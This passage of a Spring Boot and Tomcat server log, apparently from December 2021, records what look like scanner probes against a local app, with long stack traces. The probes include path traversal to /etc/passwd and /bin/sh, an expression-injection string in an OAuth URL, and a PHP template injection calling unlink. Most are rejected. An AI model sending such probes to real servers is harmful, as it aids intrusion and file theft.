+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:39.263  INFO 5896 --- [http-nio-8080-exec-3] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in the request target [/user/oauth/authorize?response_type=${43163*43800}&client_id=acme&scope=openid&redirect_uri=http://test ]. The valid characters are defined in RFC 7230 and RFC 3986
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:494) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:39.276  WARN 5896 --- [http-nio-8080-exec-6] o.s.w.s.r.ResourceHttpRequestHandler     : Path with "WEB-INF" or "META-INF": [user/./WEB-INF/web.xml]
+2021-12-16 18:13:39.359 ERROR 5896 --- [http-nio-8080-exec-10] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.springframework.web.multipart.MultipartException: Failed to parse multipart servlet request; nested exception is java.io.IOException: org.apache.tomcat.util.http.fileupload.FileUploadException: the request was rejected because no multipart boundary was found] with root cause
+
+org.apache.tomcat.util.http.fileupload.FileUploadException: the request was rejected because no multipart boundary was found
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemIteratorImpl.init(FileItemIteratorImpl.java:174) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemIteratorImpl.getMultiPartStream(FileItemIteratorImpl.java:190) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemIteratorImpl.findNextItem(FileItemIteratorImpl.java:209) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemIteratorImpl.<init>(FileItemIteratorImpl.java:127) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.FileUploadBase.getItemIterator(FileUploadBase.java:256) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:280) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.Request.parseParts(Request.java:2922) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.Request.getParts(Request.java:2824) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.RequestFacade.getParts(RequestFacade.java:1098) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.parseRequest(StandardMultipartHttpServletRequest.java:95) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.<init>(StandardMultipartHttpServletRequest.java:88) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.multipart.support.StandardServletMultipartResolver.resolveMultipart(StandardServletMultipartResolver.java:122) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.checkMultipart(DispatcherServlet.java:1202) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1036) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:681) ~[tomcat-embed-core-9.0.52.jar:4.0.FR]
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) ~[tomcat-embed-core-9.0.52.jar:4.0.FR]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:39.465  INFO 5896 --- [http-nio-8080-exec-9] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in the request target [/user/type.php?template=tag_(){}%3b@unlink(file)%3becho ]. The valid characters are defined in RFC 7230 and RFC 3986
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:494) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:39.531  WARN 5896 --- [http-nio-8080-exec-10] o.s.w.s.r.ResourceHttpRequestHandler     : Path contains "../" after call to StringUtils#cleanPath: [user/lib/..../..../..../..../..../..../..../..../etc/passwd]
+2021-12-16 18:13:39.539  WARN 5896 --- [http-nio-8080-exec-3] o.a.c.w.AbstractFileResourceSet          : Resource for web application [] at path [/user/../../../../bin/sh HTTP/1.0] was not loaded as the canonical path [/user/././././bin/sh HTTP/1.0] did not match. Use of symlinks is one possible cause.
+2021-12-16 18:13:39.848  WARN 5896 --- [http-nio-8080-exec-6] o.s.w.s.r.ResourceHttpRequestHandler     : Path contains "../" after call to StringUtils#cleanPath: [user/../../../../../../../../../../../etc/passwd#/a]
+2021-12-16 18:13:39.953 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:39.976 ERROR 5896 --- [http-nio-8080-exec-5] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:40.024 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:44.206 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:45.075  INFO 5896 --- [http-nio-8080-exec-6] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x030x000x00+&0xe00x000x000x000x000x00Cookie: ]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:419) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:15:15.169 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : 123
